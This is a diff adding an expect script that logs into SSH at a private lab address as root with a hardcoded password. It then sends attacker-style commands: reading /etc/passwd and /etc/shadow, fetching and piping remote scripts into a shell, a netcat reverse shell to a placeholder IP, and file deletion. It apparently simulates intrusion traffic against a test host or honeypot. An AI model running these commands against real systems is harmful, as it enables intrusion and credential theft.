@@ -1,0 +1,15 @@
+#!/usr/bin/expect -f
+set timeout 30
+spawn ssh -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null root@172.28.0.10
+expect "assword:" { send "admin123\r" }
+expect -re {[#$] $}
+foreach c {
+  "whoami" "id" "uname -a" "cat /etc/passwd" "cat /etc/shadow"
+  "wget http://example.com/evil.sh" "curl http://example.com/x | sh"
+  "nc -e /bin/sh 1.2.3.4 4444" "crontab -l" "rm -rf /tmp/x"
+} {
+  send "$c\r"
+  expect { -re {[#$] $} {} timeout {} }
+}
+send "exit\r"
+expect eof
